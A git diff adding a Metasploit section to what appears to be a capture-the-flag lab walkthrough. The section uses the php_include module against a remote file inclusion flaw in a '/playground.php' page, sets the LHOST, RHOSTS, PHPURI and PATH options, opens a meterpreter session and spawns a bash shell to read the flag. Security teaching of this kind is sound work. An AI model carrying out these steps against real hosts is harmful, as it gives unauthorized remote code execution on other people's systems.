@@ -121,3 +121,25 @@ And we can also confirm the test on the website where we can see the output cont
 This confirms there is a RFI vulnerability which we can exploit to gain RCE access.  
 
 ### 🔥 Metasploit option  
+For this method we will use the PHP_Include metasploit module to gain RCE access.  
+Open up metasploit using ```mfsconsole```  
+Once Metasploit has started we will load our module using ```use exploit/unix/webapp/php_include```  
+Next type in ```show options``` which will bring up the different payload options. We will need to configure some options to enable this attack.  
+![lab4_mfs_options](./Images/lab4_mfs_options.png)  
+
+#### ⚙️ **Options**  
+Some options are already pre-set with default values. The ones we need to configure are **PATH**, **PHPURI**, **RHOSTS** and **LHOST**  
+**LHOST** Set this to be your AttackBox or VM ipaddress.  
+**RHOSTS** Set this to be the IP address of the target machine. You can find this in the address bar of the /playground website.
+**PHPURI** This sets the point where the payload should be inserted. Input ```?file=XXpathXX```  
+**PATH** This sets the base directory which will be added to the url ```/playground.php```  
+You should end up with a similar setup as below.  
+![lab4_set_options](./Images/lab4_set_options.png)  
+![lab4_options_set](./Images/lab4_options_set.png)  
+
+Now we and run the exploit be using either ```run``` or ```exploit```  
+If successful we should see a meterpreter session has been created.  
+![lab4_shell_success](./Images_shell_success.png)  
+
+Now we can spawn a bash shell and retrive the flag. Type in ```shell -b``` to spawn a bash shell and the input ```hostname``` to retrive our flag.  
+![lab4_flag](./Images/lab4_flag.png)  
